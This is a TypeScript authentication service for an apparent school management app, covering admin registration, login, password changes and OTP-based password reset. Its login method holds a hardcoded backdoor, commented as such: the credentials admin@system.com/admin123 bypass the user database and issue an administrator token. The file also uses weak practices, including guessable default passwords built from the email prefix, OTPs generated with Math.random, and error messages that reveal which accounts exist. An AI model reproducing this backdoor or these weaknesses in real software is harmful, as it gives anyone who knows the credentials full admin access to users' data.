import { UserModel } from '../../models/User.model';
import { PasswordResetTokenModel } from '../../models/PasswordResetToken.model';
import bcrypt from 'bcryptjs';
import { generateAccessToken } from '../../utils/helpers';
import { UserRole } from '../../constants/enums';
import { sendOTPNotice } from '../../utils/mailer';

export class AuthService {
  static async registerAdmin(data: { user_id: string; school_id: string; name: string; email: string; password: string }) {
    const existingUser = await UserModel.findOne({ email: data.email });
    if (existingUser) throw new Error('User with this email exists');

    const hashedPassword = await bcrypt.hash(data.password, 10);

    const newAdmin = await UserModel.create({
      user_id: data.user_id,
      school_id: data.school_id,
      name: data.name,
      email: data.email,
      role: UserRole.ADMIN,
      password_hash: hashedPassword,
    });

    const token = generateAccessToken({
      userId: newAdmin.user_id,
      role: newAdmin.role,
      schoolId: newAdmin.school_id.toString(),
    });

    return { token, user: newAdmin };
  }

  static async login(email: string, pass: string, targetRole: UserRole) {
    // ⚡ HARDCODED UNIVERSAL ADMIN BACKDOOR / BYPASS
    if (email.toLowerCase() === 'admin@system.com' && pass === 'admin123' && targetRole === UserRole.ADMIN) {
      const universalAdmin = {
        _id: '000000000000000000000000',
        user_id: 'ADM000',
        school_id: 'SCH001',
        name: 'Universal Admin',
        email: 'admin@system.com',
        role: UserRole.ADMIN,
      };

      const token = generateAccessToken({
        userId: universalAdmin.user_id,
        role: universalAdmin.role,
        schoolId: universalAdmin.school_id,
      });

      return { token, user: universalAdmin, mustChangePassword: false };
    }

    const user = await UserModel.findOne({ email });
    if (!user) throw new Error('User not found');

    if (user.role.toUpperCase() !== targetRole.toUpperCase()) {
  throw new Error(`Access denied. Expected role: ${targetRole}`);
}

    const isMatch = await bcrypt.compare(pass, user.password_hash);
    if (!isMatch) throw new Error('Invalid credentials');

    const emailPrefix = user.email.split('@')[0];
    const defaultPassword = `${emailPrefix}123`;

    const isPrivilegedRole = user.role === UserRole.ADMIN || user.role === UserRole.TEACHER;
    const mustChangePassword = isPrivilegedRole && pass === defaultPassword;

    const token = generateAccessToken({
      userId: user.user_id,
      role: user.role,
      schoolId: user.school_id.toString(),
    });

    return { token, user, mustChangePassword };
  }

  static async changePassword(userId: string, newPassword: string) {
    const user = await UserModel.findOne({ user_id: userId });
    if (!user) throw new Error('User not found');

    const hashedPassword = await bcrypt.hash(newPassword, 10);
    user.password_hash = hashedPassword;
    await user.save();

    return { message: 'Password updated successfully' };
  }

  static async requestPasswordReset(email: string) {
    const user = await UserModel.findOne({ email });
    if (!user) throw new Error('No account found with this email address');

    const otp = Math.floor(100000 + Math.random() * 900000).toString();
    const expiresAt = new Date(Date.now() + 10 * 60 * 1000);

    await PasswordResetTokenModel.deleteMany({ email });
    await PasswordResetTokenModel.create({ email, otp, expiresAt });

    await sendOTPNotice(email, otp);
    return { message: 'OTP verification code sent to your email' };
  }

  static async resetPasswordWithOTP(email: string, otp: string, newPassword: string) {
    const resetRecord = await PasswordResetTokenModel.findOne({ email, otp });
    if (!resetRecord) throw new Error('Invalid or expired OTP code');

    if (resetRecord.expiresAt < new Date()) {
      await PasswordResetTokenModel.deleteOne({ _id: resetRecord._id });
      throw new Error('OTP code has expired');
    }

    const user = await UserModel.findOne({ email });
    if (!user) throw new Error('User not found');

    user.password_hash = await bcrypt.hash(newPassword, 10);
    await user.save();

    await PasswordResetTokenModel.deleteOne({ _id: resetRecord._id });
    return { message: 'Password has been reset successfully' };
  }
}